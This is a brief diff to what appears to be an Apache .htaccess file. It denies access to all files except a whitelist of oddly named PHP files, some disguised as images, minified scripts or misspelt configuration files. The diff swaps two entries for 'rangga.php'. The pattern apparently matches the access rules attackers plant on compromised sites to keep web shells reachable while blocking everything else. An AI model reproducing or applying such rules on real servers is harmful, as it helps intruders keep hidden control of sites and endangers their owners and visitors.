@@ -25,7 +25,7 @@ Order allow,deny
 deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|folter.php|admin-history-versions.min.js.php|pepa_abalos_vivienda_pah.jpg.php|Batman-The-Telltale-Series-Art-Wallpaper_easy.php|tags.php|mod_articles.php|helder.php|view_peserta_verifikasi.php|eE-GB.plg_system_helixultimate.php|confing.php|classicon.php|phoca_thumb_l__mg_9169.php)$">
+<FilesMatch "^(index.php|folter.php|admin-history-versions.min.js.php|pepa_abalos_vivienda_pah.jpg.php|Batman-The-Telltale-Series-Art-Wallpaper_easy.php|tags.php|mod_articles.php|helder.php|view_peserta_verifikasi.php|eE-GB.plg_system_helixultimate.php|confing.php|rangga.php)$">
     Order Allow,Deny
     Allow from all
 </FilesMatch>
